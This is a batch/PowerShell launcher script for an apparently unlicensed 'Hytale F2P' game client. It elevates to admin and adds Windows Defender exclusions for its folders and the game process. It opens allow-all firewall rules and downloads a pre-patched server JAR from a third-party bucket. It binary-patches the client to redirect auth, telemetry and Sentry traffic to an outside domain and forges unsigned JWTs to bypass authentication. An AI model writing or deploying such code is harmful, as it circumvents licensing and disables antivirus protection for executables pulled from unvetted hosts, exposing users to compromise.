<# :
@echo off
title HYTALE F2P - AUTO-PILOT LAUNCHER
chcp 65001 >nul

:: =========================================================
:: 1. ROBUST ARGUMENT DETECTION (Batch Side)
:: =========================================================
set "IS_SHORTCUT=false"
set "EXTRA_ARGS="

for %%a in (%*) do (
    if /I "%%a"=="am_shortcut" (set "IS_SHORTCUT=true"; set "EXTRA_ARGS=am_shortcut")
)

:: =========================================================
:: 2. UAC & WHITELISTING LOGIC (Smart Elevation)
:: =========================================================
set "WHITE_FLAG=%LOCALAPPDATA%\HytaleF2P\.whitelisted"

:: Check if already elevated
>nul 2>&1 reg.exe query HKU\S-1-5-19 && (goto gotAdmin)

:: Check if Firewall is already whitelisted (Zero-Prompt for return users)
powershell -NoProfile -Command "if ((netsh advfirewall firewall show rule name='Hytale F2P - Game Client' 2>$null) -match 'no rules match') { exit 1 } else { exit 0 }"
if %errorlevel% equ 0 goto startLauncher

:: Backup check: If whitelisted flag exists, skip UAC
if exist "%WHITE_FLAG%" goto startLauncher

:elevate
:: Request Admin once to setup network & AV permissions
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList 'am_wt %EXTRA_ARGS%' -Verb RunAs"
exit /b

:gotAdmin
:: Perform one-time setup (AV + Firewall) and create flag
if not exist "%LOCALAPPDATA%\HytaleF2P" mkdir "%LOCALAPPDATA%\HytaleF2P"
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0', '%LOCALAPPDATA%\HytaleF2P' -ErrorAction SilentlyContinue" >nul 2>&1
echo Done > "%WHITE_FLAG%"

:startLauncher
pushd "%CD%" && CD /D "%~dp0"

:: Handle Windows Terminal (Persisting Arguments)
if not "%~1"=="am_wt" (
    where wt.exe >nul 2>&1 && (
        wt cmd /c "%~f0" am_wt %EXTRA_ARGS%
        exit /b
    )
)

:: 3. CRASH-PROOF LOADER
set "PS_CMD=$f=[System.IO.Path]::GetFullPath('%~f0'); iex ((Get-Content -LiteralPath $f) | Where-Object {$found -or $_ -match '^#PS_START'} | ForEach-Object {$found=$true; $_} | Out-String)"

:: Inject shortcut status
powershell -NoProfile -ExecutionPolicy Bypass -Command "%PS_CMD%"
exit /b
#>

#PS_START
$ProgressPreference = 'SilentlyContinue'

# --- SECURITY PROTOCOL (Fix for GitHub Downloads) ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- Filename Restoration (Fix GAMELA~2.BAT Bug) ---
if ($f -match "GAMELA~") {
    $correctName = Join-Path (Split-Path $f) "game launcher.bat"
    if (-not (Test-Path $correctName)) {
        try {
            Rename-Item $f "game launcher.bat" -ErrorAction SilentlyContinue
            $f = $correctName
        } catch {}
    }
}

# --- Admin Detection ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# --- UI Enhancement ---
try {
    # Set modern window size
    $width = 120; $height = 35
    $size = New-Object System.Management.Automation.Host.Size($width, $height)
    $Host.UI.RawUI.WindowSize = $size
    $Host.UI.RawUI.BufferSize = $size
    
    # Add Antivirus Exclusions (Admin only)
    if ($isAdmin) {
        Write-Host "      [AV] Adding Windows Defender exclusions..." -ForegroundColor Gray
        Add-MpPreference -ExclusionPath $localAppData -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $gameExe -ErrorAction SilentlyContinue
    }
} catch {}

try { Add-Type -AssemblyName System.Net.Http, System.IO.Compression.FileSystem, System.Windows.Forms } catch {}

# --- C# Accelerator for Binary Patching (Required for speed) ---
try {
    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    
    public class User32 {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
    }

    public class ByteUtils {
        public static List<int> FindPattern(byte[] fileBytes, byte[] pattern) {
            List<int> positions = new List<int>();
            int patternLength = pattern.Length;
            int totalLength = fileBytes.Length;
            for (int i = 0; i <= totalLength - patternLength; i++) {
                bool match = true;
                for (int j = 0; j < patternLength; j++) {
                    if (fileBytes[i + j] != pattern[j]) {
                        match = false;
                        break;
                    }
                }
                if (match) positions.Add(i);
            }
            return positions;
        }
    }
"@
} catch {}

# Minimum space requirements in bytes
$REQ_CORE_SPACE = 888 * 1024 * 1024     # 888 MB
$REQ_ASSET_SPACE = 2 * 1024 * 1024 * 1024 # 2 GB

# --- Configuration ---
$API_HOST = "http://72.62.192.173:5000"
$AUTH_URL_SESSIONS = "https://auth.sanasol.ws"
$AUTH_URL_AUTH = "https://sessions.sanasol.ws"
$global:AUTH_URL_CURRENT = $AUTH_URL_SESSIONS

# Patching Defaults
$ORIGINAL_DOMAIN = "hytale.com"
$DEFAULT_NEW_DOMAIN = "auth.sanasol.ws"

$OFFICIAL_BASE = "https://game-patches.hytale.com/patches"
$ZIP_FILENAME = "latest.zip"
$ASSET_ZIP_FILENAME = "Assets.zip"

$localAppData = "$env:LOCALAPPDATA\HytaleF2P"
$PublicConfig = "C:\Users\Public\HytaleF2P"
$pathConfigFile = Join-Path $localAppData "path_config.json"

function Resolve-GamePath {
    # 1. Check Script Folder FIRST (Project Aware)
    $s_path = if ($env:_SCRIPT_PATH) { $env:_SCRIPT_PATH } else { $PSCommandPath }
    if ($s_path) {
        $scriptDir = Split-Path $s_path
        $inScriptPath = Join-Path $scriptDir "release\package\game\latest\Client\HytaleClient.exe"
        if (Test-Path $inScriptPath) { return $inScriptPath }
        
        # Also check if we are already inside the Client folder
        $inClientPath = Join-Path $scriptDir "HytaleClient.exe"
        if (Test-Path $inClientPath) { return $inClientPath }
    }

    # 2. Check stored config
    if (Test-Path $pathConfigFile) {
        $cfg = Get-Content $pathConfigFile | ConvertFrom-Json
        if (Test-Path $cfg.gamePath) { return $cfg.gamePath }
    }

    # 3. Check Default AppData
    $defAppData = Join-Path $localAppData "release\package\game\latest\Client\HytaleClient.exe"
    if (Test-Path $defAppData) { return $defAppData }

    # 4. Check Common Custom Paths
    $commonPaths = @(
        "C:\Program Files\Hytale F2P\Hytale F2P Launcher",
        "C:\Users\$env:USERNAME\Hytale F2P Launcher",
        "C:\Hytale F2P"
    )
    foreach ($path in $commonPaths) {
        $potential = Join-Path $path "release\package\game\latest\Client\HytaleClient.exe"
        if (Test-Path $potential) { return $potential }
    }

    # 5. Manual Prompt (GUI Folder Picker)
    Write-Host "[!] Could not find HytaleClient.exe automatically." -ForegroundColor Yellow
    Write-Host "    Launching Folder Selection Dialog... (Tip: Close it to use the default path)" -ForegroundColor Gray
    
    $dialog = New-Object System.Windows.Forms.FolderBrowserDialog
    $dialog.Description = "Select your 'Hytale F2P Launcher' installation folder"
    $dialog.ShowNewFolderButton = $false
    
    # Try to bring to front
    $owner = New-Object System.Windows.Forms.NativeWindow
    $owner.AssignHandle([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle)
    
    $result = $dialog.ShowDialog($owner)
    
    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        $userInput = $dialog.SelectedPath
        
        # Smart Check: Direct selection OR Root selection
        $pRoot = Join-Path $userInput "release\package\game\latest\Client\HytaleClient.exe"
        $pDirect = Join-Path $userInput "HytaleClient.exe"
        
        $potential = if (Test-Path $pRoot) { $pRoot } elseif (Test-Path $pDirect) { $pDirect } else { $null }
        
        if ($potential) {
            # Save for next time
            if (-not (Test-Path $localAppData)) { New-Item -ItemType Directory $localAppData -Force | Out-Null }
            $obj = @{ gamePath = $potential }
            $obj | ConvertTo-Json | Out-File $pathConfigFile
            return $potential
        } else {
            Write-Host "[ERROR] Could not find HytaleClient.exe in the selected folder." -ForegroundColor Red
            Write-Host "        Please select either the main 'Hytale F2P Launcher' folder" -ForegroundColor Gray
            Write-Host "        or the deep 'Client' folder." -ForegroundColor Gray
            Start-Sleep -Seconds 3
        }
    }
    return $null
}

$gameExe = Resolve-GamePath
if (-not $gameExe) {
    Write-Host "[INFO] Game not found or selection skipped." -ForegroundColor Yellow
    Write-Host "       Defaulting to standard path for fresh installation." -ForegroundColor Gray
    $gameExe = Join-Path $localAppData "release\package\game\latest\Client\HytaleClient.exe"
    $forceShowMenu = $true
}

# Declare shared paths (will be refined in loop)
$cacheDir = Join-Path $localAppData "cache"
$profilesDir = Join-Path $localAppData "profiles"

# Ensure global directories exist
@($cacheDir, $profilesDir) | ForEach-Object { if (-not (Test-Path $_)) { New-Item -ItemType Directory $_ -Force | Out-Null } }

$global:HEADERS = @{
    'User-Agent'    = 'HytaleF2P-Client-v2.0.11';
    'X-Auth-Token'  = 'YourSuperSecretLaunchToken12345';
}

# --- JWT Generation Helper ---
function New-HytaleJWT($uuid, $name, $issuer) {
    try {
        $now = [Math]::Floor([DateTimeOffset]::Now.ToUnixTimeSeconds())
        $exp = $now + 36000
        $header = @{ alg = "EdDSA"; kid = "2025-10-01"; typ = "JWT" } | ConvertTo-Json -Compress
        $headerBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($header)).Replace('+', '-').Replace('/', '_').Replace('=', '')
        $payload = @{
            sub = $uuid; name = $name; username = $name;
            entitlements = @("game.base"); scope = "hytale:server hytale:client";
            iat = $now; exp = $exp; iss = $issuer; jti = [guid]::NewGuid().ToString()
        } | ConvertTo-Json -Compress
        # Clean up possible json escaping that might break JWT
        $payload = $payload -replace '\\/', '/'
        $payloadBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload)).Replace('+', '-').Replace('/', '_').Replace('=', '')
        $signature = [Convert]::ToBase64String((New-Object Byte[] 64)).Replace('+', '-').Replace('/', '_').Replace('=', '')
        return "$headerBase64.$payloadBase64.$signature"
    } catch { return "offline-$uuid" }
}

# --- Helper Functions ---

# -- NODE.JS PORTED LOGIC: Player Manager & Paths --
function Get-OrCreate-PlayerId($ignored) {
    # Force use of Public folder for consistency
    if (-not (Test-Path $PublicConfig)) { try { New-Item -ItemType Directory $PublicConfig -Force | Out-Null } catch {} }
    
    $idFile = Join-Path $PublicConfig "player_id.json"
    $targetFile = $idFile

    if (Test-Path $targetFile) {
        try {
            $data = Get-Content $targetFile -Raw | ConvertFrom-Json
            if ($data.playerId) { return $data.playerId }
        } catch {}
    }
    
    $newId = [guid]::NewGuid().ToString()
    $payload = @{ playerId = $newId; createdAt = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }
    try {
        $payload | ConvertTo-Json -Depth 2 | Out-File $targetFile -Encoding UTF8
    } catch {
        $payload | ConvertTo-Json -Depth 2 | Out-File $legacyIdFile -Encoding UTF8
    }
    return $newId
}

function Find-UserDataPath($gameLatest) {
    # Replicates logic from backend/core/paths.js
    $candidates = @()
    
    # Priority order from Node.js
    $candidates += Join-Path $gameLatest "Client\UserData"
    $candidates += Join-Path $gameLatest "Client\Hytale.app\Contents\UserData"
    $candidates += Join-Path $gameLatest "Hytale.app\Contents\UserData"
    $candidates += Join-Path $gameLatest "UserData"
    
    # Explicit Windows fallback
    $candidates += Join-Path $gameLatest "Client\UserData"
    
    foreach ($cand in $candidates) {
        if (Test-Path $cand) { return $cand }
    }
    
    # Default fallback: create Client\UserData
    $defaultPath = Join-Path $gameLatest "Client\UserData"
    if (-not (Test-Path $defaultPath)) {
        New-Item -ItemType Directory $defaultPath -Force | Out-Null
    }
    return $defaultPath
}

function Ensure-ModDirs($userDataPath) {
    # Replicates getModsPath/getProfilesDir directory creation logic
    $dirs = @("Mods", "DisabledMods", "Profiles")
    
    foreach ($d in $dirs) {
        $path = Join-Path $userDataPath $d
        
        # Check for broken symlinks (Node.js logic)
        if (Test-Path -LiteralPath $path -PathType Container) {
            # Exists and is dir, good.
        } elseif ([System.IO.File]::Exists($path)) {
            # It's a file or broken link behaving like a file, delete?
            # Safe route: Do nothing if file, only create if missing.
        } else {
             New-Item -ItemType Directory $path -Force | Out-Null
        }
    }
}

# --- CLIENT PATCHING LOGIC (Node.js Port) ---
function String-ToLengthPrefixed($str) {
    # Port of stringToLengthPrefixed
    # Format: [length] [00 00 00] [char] [00] [char] ...
    $bytes = [System.Collections.Generic.List[byte]]::new()
    $length = $str.Length
    
    $bytes.Add([byte]$length)
    $bytes.Add(0); $bytes.Add(0); $bytes.Add(0)
    
    for ($i = 0; $i -lt $length; $i++) {
        $bytes.Add([byte]$str[$i])
        if ($i -lt ($length - 1)) {
            $bytes.Add(0)
        }
    }
    return $bytes.ToArray()
}

function String-ToUtf16LE($str) {
    return [System.Text.Encoding]::Unicode.GetBytes($str)
}

function Patch-Bytes($dataRef, $oldBytes, $newBytes, $desc) {
    $data = $dataRef.Value
    if ($newBytes.Length -gt $oldBytes.Length) { return 0 } # Safety
    
    # Use C# Accelerator for speed
    $positions = [ByteUtils]::FindPattern($data, $oldBytes)
    $count = $positions.Count
    
    foreach ($pos in $positions) {
        # Only overwrite length of newBytes
        for ($i = 0; $i -lt $newBytes.Length; $i++) {
            $data[$pos + $i] = $newBytes[$i]
        }
    }
    if ($count -gt 0) { Write-Host "      [PATCH] $desc ($count occurrences)" -ForegroundColor DarkGray }
    return $count
}

function Patch-HytaleClient($clientPath) {
    # Check flag file
    $patchFlag = "$clientPath.patched_custom"
    $targetDomain = "auth.sanasol.ws" # Fixed target based on provided code
    
    if (Test-Path $patchFlag) {
        try {
            $json = Get-Content $patchFlag -Raw | ConvertFrom-Json
            if ($json.targetDomain -eq $targetDomain) {
                # Verify binary integrity
                $bytes = [System.IO.File]::ReadAllBytes($clientPath)
                # Check for main domain split suffix "anasol.ws"
                $check = [System.Text.Encoding]::Unicode.GetBytes("anasol.ws")
                if ([ByteUtils]::FindPattern($bytes, $check).Count -gt 0) {
                    Write-Host "      [SKIP] Client already patched for $targetDomain" -ForegroundColor Green
                    return $true
                }
            }
        } catch {}
    }

    Write-Host "      [PATCHER] Applying Binary Patches to Client..." -ForegroundColor Cyan
    
    # Backup
    $backup = "$clientPath.original"
    if (-not (Test-Path $backup)) { Copy-Item $clientPath $backup -Force }

    $data = [System.IO.File]::ReadAllBytes($clientPath)
    $dataRef = [ref]$data

    # --- Strategy: Split Mode (>10 chars) ---
    # Domain: auth.sanasol.ws
    # Prefix: auth.s (6 chars)
    # Main:   anasol.ws
    $domainPrefix = "auth.s"
    $domainMain = "anasol.ws"
    $protocol = "https://"
    
    # 1. Patch Sentry
    $oldSentry = "https://ca900df42fcf57d4dd8401a86ddd7da2@sentry.hytale.com/2"
    $newSentry = "${protocol}t@${targetDomain}/2"
    Patch-Bytes $dataRef (String-ToLengthPrefixed $oldSentry) (String-ToLengthPrefixed $newSentry) "Sentry" | Out-Null
    
    # 2. Patch Main Domain (hytale.com -> anasol.ws)
    Patch-Bytes $dataRef (String-ToLengthPrefixed "hytale.com") (String-ToLengthPrefixed $domainMain) "Main Domain" | Out-Null
    
    # 3. Patch Subdomains (Prefix swap)
    $subs = @("https://tools.", "https://sessions.", "https://account-data.", "https://telemetry.")
    $newPrefix = "${protocol}${domainPrefix}"
    foreach ($sub in $subs) {
        Patch-Bytes $dataRef (String-ToLengthPrefixed $sub) (String-ToLengthPrefixed $newPrefix) "Subdomain $sub" | Out-Null
    }
    
    # 4. Patch Discord
    $oldDisc = ".gg/hytale"
    $newDisc = ".gg/MHkEjepMQ7"
    # Try Length Prefixed first
    $c = Patch-Bytes $dataRef (String-ToLengthPrefixed $oldDisc) (String-ToLengthPrefixed $newDisc) "Discord (LP)"
    if ($c -eq 0) {
        # Fallback UTF16
        Patch-Bytes $dataRef (String-ToUtf16LE $oldDisc) (String-ToUtf16LE $newDisc) "Discord (UTF16)" | Out-Null
    }

    # Save
    [System.IO.File]::WriteAllBytes($clientPath, $data)
    
    # Write Flag
    $flagObj = @{ targetDomain = $targetDomain; patchedAt = (Get-Date).ToString(); mode = "split" }
    $flagObj | ConvertTo-Json | Out-File $patchFlag
    Write-Host "      [SUCCESS] Client binary patching complete." -ForegroundColor Green
    return $true
}

function Patch-HytaleServer($serverJarPath) {
    if (-not (Test-Path (Split-Path $serverJarPath))) { return $false }
    
    $patchFlag = "$serverJarPath.dualauth_patched"
    $targetDomain = "auth.sanasol.ws"
    
    if (Test-Path $patchFlag) { return $true } # Assume patched if flag exists
    
    Write-Host "      [SERVER] Downloading Pre-Patched Server JAR..." -ForegroundColor Cyan
    
    # Download from R2 as per Node code
    $url = "https://pub-027b315ece074e2e891002ca38384792.r2.dev/HytaleServer.jar"
    
    # Create backup of original if exists
    if (Test-Path $serverJarPath) {
        Move-Item $serverJarPath "$serverJarPath.original" -Force -ErrorAction SilentlyContinue
    }
    
    if (Download-WithProgress $url $serverJarPath $false) {
        $flagObj = @{ domain = $targetDomain; patchedAt = (Get-Date).ToString(); source = "R2" }
        $flagObj | ConvertTo-Json | Out-File $patchFlag
        Write-Host "      [SUCCESS] Patched Server JAR installed." -ForegroundColor Green
        return $true
    } else {
        # Restore backup if failed
        if (Test-Path "$serverJarPath.original") {
            Move-Item "$serverJarPath.original" $serverJarPath -Force
        }
        return $false
    }
}

function Assert-DiskSpace($path, $requiredBytes) {
    $driveLetter = Split-Path $path -Qualifier
    if (-not $driveLetter) { $driveLetter = "C:" }
    $drive = Get-PSDrive ($driveLetter.Replace(":", ""))
    if ($drive.Free -lt $requiredBytes) {
        $freeGB = [math]::Round($drive.Free / 1GB, 2)
        $reqGB = [math]::Round($requiredBytes / 1GB, 2)
        Write-Host "      [DISK ERROR] Not enough space on $driveLetter" -ForegroundColor Red
        Write-Host "      Required: $reqGB GB | Available: $freeGB GB" -ForegroundColor Red
        return $false
    }
    return $true
}

function Get-LocalSha256($filePath) {
    if (-not (Test-Path $filePath)) { return "MISSING" }
    try { return (Get-FileHash $filePath -Algorithm SHA256).Hash } catch { return "ERROR" }
}

function Flatten-JREDir($jreLatest) {
    try {
        $entries = Get-ChildItem -Path $jreLatest -Directory
        if ($entries.Count -eq 1) {
            $nested = $entries[0].FullName
            Write-Host "      [FLATTEN] Hoisting JRE from nested folder: $($entries[0].Name)" -ForegroundColor Gray
            Get-ChildItem -Path $nested | ForEach-Object { Move-Item $_.FullName $jreLatest -Force }
            Remove-Item $nested -Recurse -Force
        }
    } catch {}
}
function Find-SystemJava {
    $candidates = @()
    if ($env:JAVA_HOME) { $candidates += Join-Path $env:JAVA_HOME "bin\java.exe" }
    $onPath = where.exe java.exe 2>$null
    if ($onPath) { $candidates += $onPath }
    
    foreach ($c in $candidates) {
        if ($c -and (Test-Path $c)) { return $c }
    }
    return $null
}

function Assert-FirewallRule($exePath) {
    if (-not (Test-Path $exePath)) { return }
    $ruleName = "Hytale F2P - Game Client"
    try {
        $existing = netsh advfirewall firewall show rule name="$ruleName" 2>$null
        if ($existing -match "no rules match") {
            Write-Host "      [FIREWALL] Creating whitelisting rule for network access..." -ForegroundColor Cyan
            netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow program="$exePath" enable=yes profile=any protocol=any | Out-Null
            netsh advfirewall firewall add rule name="$ruleName" dir=out action=allow program="$exePath" enable=yes profile=any protocol=any | Out-Null
        }
    } catch {}
}

function Remove-DuplicateMods($dir) {
    if (-not (Test-Path $dir)) { return }
    $jars = Get-ChildItem -Path $dir -Filter "*.jar"
    $groups = $jars | Group-Object { $_.Name -replace " \(\d+\)| - Copy", "" }
    foreach ($g in $groups) {
        if ($g.Count -gt 1) {
            $keep = $g.Group | Sort-Object LastWriteTime -Descending | Select-Object -First 1
            $g.Group | Where-Object { $_.FullName -ne $keep.FullName } | ForEach-Object {
                Write-Host "      [SAFETY] Removing duplicate plugin: $($_.Name)" -ForegroundColor Yellow
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Save-Config {
    try {
        if (-not (Test-Path $PublicConfig)) { try { New-Item -ItemType Directory $PublicConfig -Force | Out-Null } catch {} }
        $cfgPath = Join-Path $PublicConfig "config_data.json"
        
        # Determine the most reliable path
        $finalPath = try {
            $testFile = Join-Path $PublicConfig ".save_test"
            "t" | Out-File $testFile -ErrorAction Stop
            Remove-Item $testFile -ErrorAction SilentlyContinue
            $cfgPath
        } catch {
            Join-Path $localAppData "config_data.json"
        }

        # Load existing or create new
        $cfg = if (Test-Path $finalPath) { Get-Content $finalPath -Raw | ConvertFrom-Json } else { New-Object PSObject }
        
        # Ensure userUuids is a valid object
        if ($null -eq $cfg.userUuids) {
            $cfg | Add-Member -MemberType NoteProperty -Name "userUuids" -Value (New-Object PSObject) -Force
        }
        
        # Update properties using Add-Member (PS 5.1 compatible)
        $cfg | Add-Member -MemberType NoteProperty -Name "username" -Value $global:pName -Force
        $cfg | Add-Member -MemberType NoteProperty -Name "authUrl" -Value $global:AUTH_URL_CURRENT -Force
        $cfg | Add-Member -MemberType NoteProperty -Name "autoUpdate" -Value $global:autoUpdate -Force -ErrorAction SilentlyContinue
        $cfg | Add-Member -MemberType NoteProperty -Name "pwrVersion" -Value $global:pwrVersion -Force -ErrorAction SilentlyContinue
        $cfg | Add-Member -MemberType NoteProperty -Name "pwrHash" -Value $global:pwrHash -Force -ErrorAction SilentlyContinue
        $cfg | Add-Member -MemberType NoteProperty -Name "javaPath" -Value $global:javaPath -Force -ErrorAction SilentlyContinue

        if ($global:pName -and $global:pUuid) {
            $cfg.userUuids | Add-Member -MemberType NoteProperty -Name $global:pName -Value $global:pUuid -Force
        }
        
        $cfg | ConvertTo-Json -Depth 10 | Out-File $finalPath -Encoding UTF8
        
        if ($env:IS_SHORTCUT -ne "true") {
            $locTxt = if ($finalPath -match "Public") { "Public" } else { "Local AppData" }
            Write-Host "      [CONFIG] Saved to $locTxt." -ForegroundColor DarkGray
        }
    } catch {
        if ($env:IS_SHORTCUT -ne "true") { 
            Write-Host "      [ERROR] Could not save config: $($_.Exception.Message)" -ForegroundColor Red 
        }
    }
}

function Get-LocalSha1($filePath) {
    if (-not (Test-Path $filePath)) { return "MISSING" }
    $hashCacheFile = $filePath + ".hashcache"
    try {
        $lastModified = (Get-Item $filePath).LastWriteTime.Ticks
        if (Test-Path $hashCacheFile) {
            $cache = Get-Content $hashCacheFile -Raw | ConvertFrom-Json
            if ($cache.lastModified -eq $lastModified) { return $cache.hash }
        }
        $actualHash = (Get-FileHash $filePath -Algorithm SHA1).Hash
        $cacheObj = @{ hash = $actualHash; lastModified = $lastModified }
        $cacheObj | ConvertTo-Json | Out-File $hashCacheFile
        return $actualHash
    } catch { return "ERROR" }
}

function Get-RemoteHash($fileName) {
    try {
        $hashUrl = "$API_HOST/api/hash/$fileName"
        $response = Invoke-RestMethod -Uri $hashUrl -Headers $global:HEADERS -Method Get -TimeoutSec 10
        return $response.hash
    } catch {
        return $null
    }
}

function Test-ZipValid($zipPath) {
    if (-not (Test-Path $zipPath)) { return $false }
    try {
        $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
        $zip.Dispose()
        return $true
    } catch {
        return $false
    }
}

function Test-FileNeedsDownload($filePath, $fileName) {
    if (-not (Test-Path $filePath)) {
        Write-Host "      [CHECK] File does not exist locally." -ForegroundColor Yellow
        return $true
    }
    
    Write-Host "      [CHECK] Verifying file integrity..." -ForegroundColor Cyan
    $remoteHash = Get-RemoteHash $fileName
    if (-not $remoteHash) {
        Write-Host "      [WARN] Could not fetch remote hash. Re-downloading to be safe." -ForegroundColor Yellow
        return $true
    }
    
    $localHash = Get-LocalSha1 $filePath
    if ($localHash -eq "ERROR" -or $localHash -eq "MISSING") {
        Write-Host "      [WARN] Could not compute local hash. Re-downloading." -ForegroundColor Yellow
        return $true
    }
    
    if ($localHash -eq $remoteHash) {
        Write-Host "      [SKIP] File already up-to-date (hash match)." -ForegroundColor Green
        return $false
    } else {
        Write-Host "      [UPDATE] Hash mismatch detected. Re-downloading." -ForegroundColor Yellow
        return $true
    }
}

function Download-WithProgress($url, $destination, $useHeaders=$true) {
    $client = New-Object System.Net.Http.HttpClient
    $client.Timeout = [System.TimeSpan]::FromMinutes(120)
    
    # 1. Automatic Resume (Range Support)
    $existingOffset = 0
    if (Test-Path $destination) {
        $existingOffset = (Get-Item $destination).Length
    }
    
    if ($useHeaders) { 
        foreach ($key in $global:HEADERS.Keys) { $client.DefaultRequestHeaders.TryAddWithoutValidation($key, $global:HEADERS[$key]) } 
    }
    
    if ($existingOffset -gt 0) {
        $client.DefaultRequestHeaders.Range = New-Object System.Net.Http.Headers.RangeHeaderValue($existingOffset, $null)
    }

    try {
        $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
        
        # 2. Handle 416 (Range Not Satisfiable)
        if ($response.StatusCode -eq [System.Net.HttpStatusCode]::RequestedRangeNotSatisfiable) {
             $client.Dispose()
             Remove-Item $destination -Force
             return Download-WithProgress $url $destination $useHeaders
        }
        
        if (-not $response.IsSuccessStatusCode) { 
            Write-Host "      [ERROR] Server returned $($response.StatusCode)" -ForegroundColor Red
            return $false 
        }
        
        $isPartial = $response.StatusCode -eq [System.Net.HttpStatusCode]::PartialContent
        $contentLength = $response.Content.Headers.ContentLength
        $totalSize = if ($isPartial) { $contentLength + $existingOffset } else { $contentLength }
        
        # 3. HIGH-SPEED STREAMING (HttpClient is better than WebClient for 1GB+ files)
        $stream = $response.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
        $fileStream = if ($isPartial) {
            [System.IO.File]::Open($destination, [System.IO.FileMode]::Append)
        } else {
            [System.IO.File]::Create($destination)
        }
        
        $buffer = New-Object byte[] 4194304 # 4MB Buffer for maximum throughput
        $downloaded = if ($isPartial) { $existingOffset } else { 0 }
        $lastUpdate = $downloaded
        $startTime = [DateTime]::Now
        
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $read)
            $downloaded += $read
            # Update Every 10MB to keep CPU overhead low
            if ($downloaded -ge ($lastUpdate + 10MB) -or $downloaded -eq $totalSize) {
                $lastUpdate = $downloaded
                $percent = [math]::Floor(($downloaded / $totalSize) * 100)
                $elapsed = ([DateTime]::Now - $startTime).TotalSeconds
                $speed = if ($elapsed -gt 0) { [math]::Round(($downloaded - $existingOffset) / 1MB / $elapsed, 2) } else { 0 }
                $bar = ("#" * [math]::Floor($percent/5)) + ("." * (20 - [math]::Floor($percent/5)))
                Write-Host "`r      Progress: [$bar] $percent% ($([math]::Round($downloaded/1MB,2)) / $([math]::Round($totalSize/1MB,2)) MB) @ $speed MB/s   " -NoNewline -ForegroundColor Yellow
            }
        }
        Write-Host ""; return $true
    } catch { 
        Write-Host "`n      [DOWNLOAD EXCEPTION] $($_.Exception.Message)" -ForegroundColor Red
        return $false 
    }
    finally { 
        if ($fileStream) { $fileStream.Close(); $fileStream.Dispose() }
        if ($stream) { $stream.Close(); $stream.Dispose() }
        if ($client) { $client.Dispose() }
    }
}

function Copy-WithProgress($source, $destination) {
    if (-not (Test-Path $source)) { return $false }
    try {
        $sourceFile = [System.IO.File]::OpenRead($source)
        $destFile = [System.IO.File]::Create($destination)
        $totalSize = $sourceFile.Length
        $buffer = New-Object byte[] 1048576 # 1MB buffer
        $copied = 0; $lastUpdate = 0
        
        while (($read = $sourceFile.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $destFile.Write($buffer, 0, $read)
            $copied += $read
            if ($copied -ge ($lastUpdate + 10MB) -or $copied -eq $totalSize) {
                $lastUpdate = $copied
                $percent = [math]::Floor(($copied / $totalSize) * 100)
                $bar = ("#" * [math]::Floor($percent/5)) + ("." * (20 - [math]::Floor($percent/5)))
                Write-Host "`r      Copying: [$bar] $percent% ($([math]::Round($copied/1MB,2)) / $([math]::Round($totalSize/1MB,2)) MB)  " -NoNewline -ForegroundColor Gray
            }
        }
        Write-Host ""
        return $true
    } catch { return $false }
    finally { if ($sourceFile) { $sourceFile.Close() }; if ($destFile) { $destFile.Close() } }
}

function Get-LatestPatchVersion {
    $cacheFile = Join-Path $cacheDir "highest_version.txt"
    $api_url = "https://files.hytalef2p.com/api/version_client"
    
    # --- Try API First (Instant) ---
    try {
        Write-Host "      [API] Fetching latest client version..." -ForegroundColor Gray
        $api_res = Invoke-RestMethod -Uri $api_url -Headers @{ 'User-Agent' = 'Hytale-F2P-Launcher' } -TimeoutSec 5
        if ($api_res -and $api_res.client_version) {
            # Extract number from "7.pwr"
            if ($api_res.client_version -match "(\d+)") {
                $ver = [int]$matches[1]
                $ver | Out-File $cacheFile
                Write-Host "      [SUCCESS] API returned version: $ver.pwr" -ForegroundColor Green
                return $ver
            }
        }
    } catch {
        Write-Host "      [WARN] API offline, switching to smart probe..." -ForegroundColor Yellow
    }

    # --- Fallback: Smart Batch-Based Probe (Infinite) ---
    $client = New-Object System.Net.Http.HttpClient
    $client.Timeout = [System.TimeSpan]::FromSeconds(3)
    
    # Load previously known highest to speed up probe
    $highestKnown = if (Test-Path $cacheFile) { [int](Get-Content $cacheFile) } else { 0 }
    $currentStart = if ($highestKnown -gt 0) { $highestKnown } else { 0 }
    
    $highestFound = $highestKnown
    $probing = $true
    $batchSize = 25

    Write-Host "      [PROBE] Scanning for patches (starting at v$currentStart)..." -ForegroundColor Gray

    while ($probing) {
        $tasks = New-Object System.Collections.Generic.List[System.Threading.Tasks.Task[System.Net.Http.HttpResponseMessage]]
        $batchRange = $currentStart..($currentStart + $batchSize)
        
        foreach ($i in $batchRange) {
            $url = "$OFFICIAL_BASE/windows/amd64/release/0/$i.pwr"
            $req = New-Object System.Net.Http.HttpRequestMessage([System.Net.Http.HttpMethod]::Head, $url)
            $tasks.Add($client.SendAsync($req))
        }

        try { [System.Threading.Tasks.Task]::WaitAll($tasks.ToArray()) } catch {}

        $foundInBatch = $false
        for ($j = $batchSize; $j -ge 0; $j--) {
            $t = $tasks[$j]
            if ($t.Status -eq 'RanToCompletion' -and $t.Result.IsSuccessStatusCode) {
